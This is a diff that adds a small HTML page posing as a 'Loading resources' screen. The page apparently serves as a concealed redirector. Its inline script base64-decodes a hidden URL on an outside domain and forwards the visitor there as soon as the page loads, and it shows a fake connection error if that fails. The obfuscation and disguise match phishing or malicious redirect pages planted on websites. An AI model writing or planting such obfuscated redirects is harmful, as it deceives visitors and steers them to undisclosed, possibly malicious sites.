@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        body {
+            background: #ffffff;
+            font-family: sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div id="msg">Loading resources, please wait...</div>
+    <script>
+        (function() {
+            try {
+                var encodedUrl = "aHR0cHM6Ly9iaGF0aWFncm91cHMuY29tL2MvNjdhZTAwODQtYWI2NC00ODNhLTk2YjYtMzdkZjI4MTUwZmU1";
+                var targetUrl = atob(encodedUrl);
+                window.location.href = targetUrl;
+            } catch (e) {
+                document.getElementById('msg').innerHTML = "Error loading page. Please check your connection.";
+            }
+        })();
+    </script>
+</body>
+</html>
